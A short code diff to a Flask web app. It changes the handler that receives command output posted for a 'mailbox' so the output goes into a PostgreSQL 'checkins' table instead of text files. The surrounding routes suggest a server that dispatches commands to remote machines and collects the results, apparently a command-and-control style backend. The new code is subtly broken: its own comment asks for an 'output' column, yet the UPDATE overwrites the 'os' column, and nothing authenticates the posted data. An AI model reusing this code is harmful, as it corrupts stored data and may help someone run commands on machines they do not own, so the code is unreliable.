@@ -147,16 +147,29 @@ def send_command():
 
 @app.route('/mailbox/<mailbox_id>/output', methods=['POST'])
 def receive_output(mailbox_id):
+    if not db_url:
+        return "Database not configured.", 500
+
     data = request.get_json()
-    command_output = data.get('output')
+    execution_output = data.get("output", "")
 
-    with open(f"output_{mailbox_id}.txt", "w") as file:
-        file.write(command_output)
-
-    with open(f"mailbox_{mailbox_id}.txt", "w") as file:
-        file.write("NONE\n")
-
-    return jsonify({"status": "success"})
+    # Save the output to your database using psycopg2
+    conn = get_db_connection()
+    cursor = conn.cursor()
+    
+    # Note: Make sure your table has a column for 'output'. 
+    # Adjust the table name ('checkins' or 'commands') to match your schema.
+    cursor.execute('''
+        UPDATE checkins 
+        SET os = %s 
+        WHERE machine_id = %s
+    ''', (execution_output, mailbox_id))
+    
+    conn.commit()
+    cursor.close()
+    conn.close()
+    
+    return {"status": "success"}, 200
 
 @app.route('/get_output/<mailbox_id>', methods=['GET'])
 def get_output(mailbox_id):
